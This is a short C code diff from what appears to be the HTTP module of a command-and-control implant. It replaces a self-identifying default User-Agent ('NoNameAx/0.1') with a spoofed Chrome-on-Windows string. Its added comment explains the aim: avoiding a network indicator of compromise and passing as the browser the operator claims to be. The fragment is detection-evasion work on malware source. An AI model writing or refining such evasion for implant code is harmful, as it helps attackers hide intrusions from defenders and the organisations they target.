@@ -52,7 +52,15 @@ FUNC BOOL NaxHttpEnsureSession( PNAX_INSTANCE Nax, const PWCHAR host, INTERNET_P
             while ( Nax->Config.UserAgent[ ui ] && ui < 254 ) { ua_buf[ui] = (WCHAR)(BYTE)Nax->Config.UserAgent[ ui ]; ui++; }
             ua_buf[ui] = L'\0';
         } else {
-            WCHAR def[] = { 'N','o','N','a','m','e','A','x','/','0','.','1','\0' };
+            /* No family-name fallbacks: a pre-profile UA is itself a wire IOC.
+             * The fallback looks like the browser the operator claims to be;
+             * the listener profile normally supplies the real one. */
+            WCHAR def[] = {
+                'M','o','z','i','l','l','a','/','5','.','0',' ','(','W','i','n','d','o','w','s',' ','N','T',' ',
+                '1','0','.','0',';',' ','W','i','n','6','4',';',' ','x','6','4',')',' ','A','p','p','l','e','W','e','b','K','i','t','/','5','3','7','.','3','6',' ',
+                '(','K','H','T','M','L',',',' ','l','i','k','e',' ','G','e','c','k','o',')',' ','C','h','r','o','m','e','/','1','3','6','.','0','.','0','.','0',' ',
+                'S','a','f','a','r','i','/','5','3','7','.','3','6','\0'
+            };
             MmCopy( ua_buf, def, sizeof( def ) );
         }
 
